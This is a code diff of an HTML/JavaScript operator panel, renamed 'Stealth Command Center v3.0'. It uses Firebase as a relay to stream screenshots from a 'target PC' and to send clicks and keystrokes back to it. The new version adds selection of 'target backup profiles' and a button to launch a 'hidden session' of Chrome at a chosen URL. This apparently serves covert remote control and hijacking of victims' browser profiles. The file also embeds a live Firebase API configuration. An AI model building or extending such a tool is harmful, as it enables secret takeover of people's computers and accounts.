@@ -3,170 +3,154 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Base64 Remote Control</title>
+    <title>Stealth Chrome Control v3.0</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
     <style>
+        :root {
+            --neon-green: #00ff41;
+            --bg-dark: #0a0a0a;
+            --panel-bg: #161616;
+        }
         body { 
-            background: #0b0b0b; 
-            color: #00ff41; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            text-align: center; 
+            background: var(--bg-dark); 
+            color: var(--neon-green); 
+            font-family: 'Segoe UI', 'Courier New', monospace; 
             margin: 0; 
-            display: flex;
-            flex-direction: column;
+            display: flex; 
+            flex-direction: column; 
             align-items: center;
             min-height: 100vh;
+            padding: 20px;
         }
-        .container { 
+        .header {
+            text-shadow: 0 0 10px var(--neon-green);
+            margin-bottom: 20px;
+            letter-spacing: 2px;
+        }
+        .panel { 
+            background: var(--panel-bg); 
             padding: 20px; 
+            border-radius: 12px; 
+            border: 1px solid #333; 
             width: 100%;
             max-width: 900px;
-        }
-        
-        .header {
             margin-bottom: 20px;
-            text-shadow: 0 0 10px #00ff41;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
-
-        .viewport-wrapper {
-            position: relative; 
-            display: inline-block; 
-            border: 2px solid #00ff41; 
-            background: #000;
-            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
-            border-radius: 8px;
-            overflow: hidden;
+        .grid-layout {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 15px;
         }
-        
         #live-view { 
             width: 100%; 
             max-width: 854px; 
+            border: 2px solid #333; 
+            border-radius: 8px;
             cursor: crosshair; 
-            display: block; 
-            min-height: 480px;
+            background: #000;
+            transition: border-color 0.3s;
         }
-
-        .status-bar { 
-            font-size: 14px; 
-            margin-bottom: 15px; 
-            padding: 8px;
-            background: rgba(0, 255, 65, 0.1);
-            border-radius: 4px;
-            width: 100%;
+        #live-view:hover {
+            border-color: var(--neon-green);
         }
-
-        .controls-panel {
-            margin-top: 20px; 
-            padding: 20px; 
-            background: #161616;
-            border-radius: 12px;
-            border: 1px solid #333;
-            width: 100%;
-            box-sizing: border-box;
-        }
-
-        .input-group {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-            margin-top: 15px;
-        }
-
-        .kb-input { 
-            background: #000; 
-            border: 1px solid #444; 
-            color: #00ff41; 
-            padding: 12px 15px; 
-            flex-grow: 1;
-            font-size: 16px; 
-            outline: none;
-            border-radius: 6px;
-            transition: border 0.3s;
-        }
-
-        .kb-input:focus {
-            border-color: #00ff41;
-        }
-
         .btn { 
             background: #222; 
-            border: 1px solid #00ff41; 
-            color: #00ff41; 
-            padding: 10px 20px; 
+            border: 1px solid var(--neon-green); 
+            color: var(--neon-green); 
+            padding: 12px 20px; 
             cursor: pointer; 
-            text-transform: uppercase;
+            border-radius: 6px; 
             font-weight: bold;
-            border-radius: 6px;
             transition: all 0.2s;
+            text-transform: uppercase;
         }
-
         .btn:hover { 
-            background: #00ff41; 
+            background: var(--neon-green); 
             color: #000; 
-            box-shadow: 0 0 10px #00ff41;
+            box-shadow: 0 0 15px var(--neon-green);
         }
-
-        .btn:active {
-            transform: translateY(2px);
-        }
-
-        .special-keys { 
-            margin-bottom: 15px; 
-            display: flex; 
-            justify-content: center; 
-            gap: 10px; 
-            flex-wrap: wrap;
-        }
-
-        .btn-orange {
+        .btn-action {
+            background: #1a1a1a;
             border-color: #ff9f00;
             color: #ff9f00;
         }
-
-        .btn-orange:hover {
+        .btn-action:hover {
             background: #ff9f00;
             color: #000;
-            box-shadow: 0 0 10px #ff9f00;
+            box-shadow: 0 0 15px #ff9f00;
         }
-
-        .footer-note {
-            margin-top: 15px;
+        select, input { 
+            background: #000; 
+            border: 1px solid #444; 
+            color: var(--neon-green); 
+            padding: 12px; 
+            border-radius: 6px;
+            outline: none;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        select:focus, input:focus {
+            border-color: var(--neon-green);
+        }
+        .status-tag {
             font-size: 12px;
-            color: #666;
+            padding: 5px 10px;
+            border-radius: 4px;
+            background: rgba(0,255,65,0.1);
+            display: inline-block;
+            margin-bottom: 10px;
+        }
+        .input-row {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .profile-info {
+            font-size: 0.9em;
+            color: #888;
+            margin-bottom: 10px;
+            text-align: left;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2 class="header">WEB CONSOLE v2.0</h2>
-        
-        <div class="status-bar" id="stat">Sytem Booting...</div>
-
-        <div class="viewport-wrapper">
-            <img id="live-view" src="" alt="WAITING FOR STREAM..." onclick="sendClick(event)">
+    <h2 class="header">STEALTH COMMAND CENTER v3.0</h2>
+    
+    <div class="panel">
+        <div class="profile-info">Select target backup profile and URL:</div>
+        <div class="grid-layout">
+            <select id="profile-list">
+                <option value="">Scanning for backups...</option>
+            </select>
+            <input type="text" id="target-url" placeholder="https://google.com">
         </div>
+        <button class="btn" style="width: 100%;" onclick="launchProfile()">⚡ INITIALIZE HIDDEN SESSION</button>
+    </div>
 
-        <div class="controls-panel">
-            <div class="special-keys">
-                <button class="btn btn-orange" onclick="sendKey('enter', 'special')">ENTER ⏎</button>
-                <button class="btn btn-orange" onclick="sendKey('backspace', 'special')">BACKSPACE ⌫</button>
-                <button class="btn btn-orange" onclick="sendKey('tab', 'special')">TAB ⇥</button>
-                <button class="btn" onclick="location.reload()">REFRESH UI ↻</button>
-            </div>
+    <div class="status-tag" id="stat">SYSTEM: Waiting for handshake...</div>
+    
+    <div style="position: relative; width: 100%; max-width: 854px;">
+        <img id="live-view" src="" alt="STREAM OFFLINE" onclick="sendClick(event)">
+    </div>
 
-            <div class="input-group">
-                <input type="text" id="typer" class="kb-input" placeholder="Yahan type karein..." onkeypress="handleKey(event)">
-                <button class="btn" onclick="sendTyping()">SEND TEXT</button>
-            </div>
-            
-            <p class="footer-note">Note: Screen par click karne se target PC par click hoga.</p>
+    <div class="panel">
+        <div class="input-row">
+            <input type="text" id="typer" placeholder="Type text to send to remote Chrome..." onkeypress="if(event.key==='Enter') sendTyping()">
+            <button class="btn" onclick="sendTyping()">SEND</button>
+        </div>
+        <div style="margin-top: 15px; display: flex; justify-content: center; gap: 10px; flex-wrap: wrap;">
+            <button class="btn btn-action" onclick="sendKey('enter', 'special')">ENTER ⏎</button>
+            <button class="btn btn-action" onclick="sendKey('backspace', 'special')">BACKSPACE ⌫</button>
+            <button class="btn btn-action" onclick="sendKey('tab', 'special')">TAB ⇥</button>
+            <button class="btn" onclick="location.reload()">REFRESH UI</button>
         </div>
     </div>
 
     <script>
-        // Firebase Configuration
         const firebaseConfig = {
             apiKey: "AIzaSyBcL0G8b7Yt_Ahk29cUaTTfp6Uf4QgNfTI",
             authDomain: "smsyy-f7bb7.firebaseapp.com",
@@ -176,68 +160,86 @@
             appId: "1:199149027655:web:2d9e70e7dff7abc293cc62"
         };
 
-        // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
-        const auth = firebase.auth();
 
-        // Sign in anonymously
-        auth.signInAnonymously().then(() => {
-            document.getElementById('stat').innerText = "CONNECTED: Stream ka intezar hai...";
-        }).catch(e => {
-            document.getElementById('stat').innerText = "AUTH ERROR: Settings check karein.";
+        firebase.auth().signInAnonymously().then(() => {
+            document.getElementById('stat').innerText = "SYSTEM: Authorized. Waiting for Python bridge...";
         });
 
-        // Live Stream Listener
-        db.collection("status").doc("view").onSnapshot((doc) => {
+        // 1. Monitor available profiles pushed by Python
+        db.collection("status").doc("profiles").onSnapshot((doc) => {
             if (doc.exists) {
-                const data = doc.data();
-                if (data.img_data) {
-                    document.getElementById('live-view').src = "data:image/jpeg;base64," + data.img_data;
-                    document.getElementById('stat').innerText = "LIVE | Last Sync: " + new Date().toLocaleTimeString();
+                const list = doc.data().list || [];
+                const dropdown = document.getElementById('profile-list');
+                dropdown.innerHTML = "";
+                if(list.length === 0) {
+                    dropdown.innerHTML = '<option value="">No backups found</option>';
+                } else {
+                    list.forEach(p => {
+                        const opt = document.createElement('option');
+                        opt.value = p;
+                        opt.innerText = "📁 " + p;
+                        dropdown.appendChild(opt);
+                    });
                 }
             }
         });
 
-        // Click Handler
+        // 2. Stream Live View
+        db.collection("status").doc("view").onSnapshot((doc) => {
+            if (doc.exists && doc.data().img_data) {
+                document.getElementById('live-view').src = "data:image/jpeg;base64," + doc.data().img_data;
+                document.getElementById('stat').innerText = "LIVE STREAM ACTIVE | Session: " + new Date().toLocaleTimeString();
+            }
+        });
+
+        // 3. Launch Trigger
+        function launchProfile() {
+            const p = document.getElementById('profile-list').value;
+            const u = document.getElementById('target-url').value || "google.com";
+            if (!p) {
+                alert("Please select a profile first!");
+                return;
+            }
+            db.collection("status").doc("control").set({
+                request_profile: p,
+                url: u,
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            }).then(() => {
+                document.getElementById('stat').innerText = "COMMAND SENT: Initializing " + p;
+            });
+        }
+
+        // 4. Remote Interaction
         function sendClick(e) {
             const img = document.getElementById('live-view');
             const rect = img.getBoundingClientRect();
-            
-            // Map click to 854x480 logic space
+            // Scale click from display size to 1280x720 logic handled by Python
             const x = Math.round((e.clientX - rect.left) * (854 / rect.width));
             const y = Math.round((e.clientY - rect.top) * (480 / rect.height));
-
-            db.collection("remote_clicks").doc("latest").set({
-                x: x,
+            
+            db.collection("remote_clicks").doc("latest").set({ 
+                x: x, 
                 y: y,
                 time: firebase.firestore.FieldValue.serverTimestamp()
             });
         }
 
-        // Keyboard Key Handler (Special/Text)
         function sendKey(key, type) {
-            db.collection("remote_keys").doc("latest").set({
-                key: key,
+            db.collection("remote_keys").doc("latest").set({ 
+                key: key, 
                 type: type,
                 time: firebase.firestore.FieldValue.serverTimestamp()
             });
         }
 
-        // Typing Action
         function sendTyping() {
             const input = document.getElementById('typer');
             if (input.value) {
                 sendKey(input.value, 'text');
                 input.value = "";
                 input.focus();
-            }
-        }
-
-        // Handle Enter key on input field
-        function handleKey(e) {
-            if (e.key === 'Enter') {
-                sendTyping();
             }
         }
     </script>
